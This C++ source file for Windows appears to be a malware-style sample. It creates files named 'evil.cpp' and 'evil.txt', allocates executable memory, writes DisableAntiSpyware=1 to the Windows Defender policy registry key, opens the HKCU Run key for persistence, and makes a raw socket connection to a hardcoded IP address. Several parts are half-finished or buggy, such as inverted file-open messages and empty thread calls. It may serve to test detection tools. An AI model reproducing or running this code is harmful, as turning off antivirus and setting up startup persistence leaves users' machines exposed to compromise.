#include <windows.h>
#include <iostream>
#include <map>
#include <string>
#include <cstring>
#include <vector>
#include <iterator>
#include <algorithm>
#include <fstream>
#include <stdio.h>
#include <stdlib.h>
#include <cstring>
#include <sstream>
#include <winsock.h>
using std::ostringstream;
using std::ends;
#pragma comment(lib,"ws2_32.lib")

int CreateSocket()
{
    WSADATA wsa;
    SOCKET s;
    struct sockaddr_in server;
    const char* message;
    int recv_size;
    char server_reply[3000] = { 0 };

    printf("\nInitialising Winsock...");
    if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0)
    {
        printf("Failed. Error Code : %d", WSAGetLastError());
        return 1;
    }

    printf("Initialised.\n");

    //Create a socket
    if ((s = socket(AF_INET, SOCK_STREAM, 0)) == INVALID_SOCKET)
    {
        printf("Could not create socket : %d", WSAGetLastError());
    }

    printf("Socket created.\n");


    server.sin_addr.s_addr = inet_addr("142.250.186.68");
    server.sin_family = AF_INET;
    server.sin_port = htons(80);

    //Connect to remote server
    if (connect(s, (struct sockaddr*)&server, sizeof(server)) < 0)
    {
        puts("connect error");
        return 1;
    }

    puts("Connected");

    //Send some data
    message = "GET / HTTP/1.1\r\n\r\n";
    if (send(s, message, strlen(message), 0) < 0)
    {
        puts("Send failed");
        return 1;
    }
    puts("Data Sent\n");

    //Receive a reply from the server
    if ((recv_size = recv(s, server_reply, 2000, 0)) == SOCKET_ERROR)
    {
        puts("recv failed");
    }

    puts("Reply received\n");

    //Add a NULL terminating character to make it a proper string before printing
    //server_reply[recv_size] = '\0';

    return 0;

}

int main()
{

    Sleep(2000);

    HANDLE hFile = CreateFileA("evil.cpp",                // name of the write
        GENERIC_WRITE,          // open for writing
        0,                      // do not share
        NULL,                   // default security
        CREATE_NEW,             // create new file only
        FILE_ATTRIBUTE_NORMAL,  // normal file
        NULL);                  // no attr. template

    if (!(hFile == INVALID_HANDLE_VALUE))
        printf("Could not open file\n");
    else
        printf("Successfully opened file\n");

    LPVOID address = VirtualAlloc(NULL, 11, MEM_COMMIT, PAGE_EXECUTE_READWRITE);

    hFile = CreateFileA("evil.txt",                // name of the write
        GENERIC_WRITE,          // open for writing
        0,                      // do not share
        NULL,                   // default security
        CREATE_NEW,             // create new file only
        FILE_ATTRIBUTE_NORMAL,  // normal file
        NULL);                  // no attr. template

    if (!(hFile == INVALID_HANDLE_VALUE))
        printf("Could not open file\n");
    else
        printf("Successfully opened file\n");

    address = VirtualAlloc(NULL, 11, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

    CreateThread(NULL, NULL, NULL, NULL, NULL, NULL);
    CreateThread(NULL, NULL, NULL, NULL, NULL, NULL);

    HKEY key;
    HKEY new_key;
    DWORD disable = 1;
    LONG res = RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SOFTWARE\\Policies\\Microsoft\\Windows Defender", 0, KEY_ALL_ACCESS, &key);
    RegSetValueExA(key, "DisableAntiSpyware", 0, REG_DWORD, (const BYTE*)&disable, sizeof(disable));
    RegCreateKeyExA(key, "Real-Time Protection", 0, 0, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, 0, &new_key, 0);

    // adding calling process to run
    HKEY hOpened;
    char pPath[100];
    GetModuleFileNameA(0, pPath, 100);
    RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_ALL_ACCESS, &hOpened);

    int zero = CreateSocket();
}
